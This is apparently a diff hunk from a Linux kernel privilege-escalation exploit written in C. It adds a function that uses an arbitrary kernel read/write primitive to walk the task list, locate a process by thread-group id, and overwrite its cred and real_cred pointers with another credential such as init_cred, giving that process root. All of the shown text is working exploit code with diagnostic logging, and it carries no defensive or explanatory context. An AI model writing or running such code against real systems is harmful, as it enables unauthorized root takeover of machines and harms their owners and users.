@@ -204,6 +204,62 @@ uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
   return 0;
 }
 
+/* Repoint a task's cred (real_cred+cred) to an arbitrary cred pointer
+ * (e.g. the canonical init_cred) — gives that task root without editing the
+ * cred contents. */
+int repoint_task_cred(int fd, uint32_t tgid, uintptr_t new_cred) {
+  uintptr_t head = data_addr(INIT_TASK_TASKS);
+  uintptr_t canon_head = canon_addr(INIT_TASK_TASKS);
+  uint64_t entry = 0;
+  if (configfs_read_once(fd, head, &entry, sizeof(entry)) != (ssize_t)sizeof(entry)) {
+    pr_info("repoint walk: read head failed errno=%d\n", errno);
+    fsync(1);
+    return 0;
+  }
+  pr_info("repoint walk(c): head=%016zx canon=%016zx first=%016zx\n",
+          (size_t)head, (size_t)canon_head, (unsigned long long)entry);
+  uintptr_t task = 0;
+  uint32_t last_pid = 0, last_tgid = 0;
+  int iters = 0, stop = -1;
+  for (int i = 0; i < 8192; i++) {
+    iters = i + 1;
+    if (entry == (uint64_t)canon_head || entry == (uint64_t)head) { stop = 1; break; }
+    if (!is_direct_ptr(entry)) { stop = 2; break; }
+    uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
+    uint32_t pid = 0, tg = 0;
+    configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof(pid));
+    configfs_read_once(fd, t + TASK_TGID_OFF, &tg, sizeof(tg));
+    last_pid = pid; last_tgid = tg;
+    if (tg == tgid || pid == tgid) { task = t; break; }
+    if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof(entry)) !=
+        (ssize_t)sizeof(entry)) { stop = 3; break; }
+  }
+  if (!is_direct_ptr(task)) {
+    pr_info("repoint cred: NOT FOUND tgid=%u iters=%d stop=%d last_pid=%u last_tgid=%u\n",
+            tgid, iters, stop, last_pid, last_tgid);
+    fsync(1);
+    return 0;
+  }
+  uintptr_t rc_slot = task + TASK_REAL_CRED_OFF;
+  uintptr_t c_slot = task + TASK_CRED_OFF;
+  uintptr_t rc_b = 0, c_b = 0;
+  configfs_read_once(fd, rc_slot, &rc_b, sizeof(rc_b));
+  configfs_read_once(fd, c_slot, &c_b, sizeof(c_b));
+  ssize_t w1 = configfs_write_once(fd, rc_slot, &new_cred, sizeof(new_cred));
+  ssize_t w2 = configfs_write_once(fd, c_slot, &new_cred, sizeof(new_cred));
+  uintptr_t rc_a = 0, c_a = 0;
+  configfs_read_once(fd, rc_slot, &rc_a, sizeof(rc_a));
+  configfs_read_once(fd, c_slot, &c_a, sizeof(c_a));
+  uint32_t uid_a = 0xffff;
+  configfs_read_once(fd, (uintptr_t)rc_a + 4, &uid_a, sizeof(uid_a));
+  pr_info("repoint ok tgid=%u task=%016zx iters=%d real %016zx->%016zx cred %016zx->%016zx "
+          "new=%016zx uid_now=%u wr=%zd/%zd\n",
+          tgid, (size_t)task, iters, (size_t)rc_b, (size_t)rc_a, (size_t)c_b, (size_t)c_a,
+          (size_t)new_cred, uid_a, w1, w2);
+  fsync(1);
+  return (w1 == (ssize_t)sizeof(new_cred));
+}
+
 int patch_cred_identity(int fd, uintptr_t cred) {
   if (!is_direct_ptr(cred)) {
     return 0;
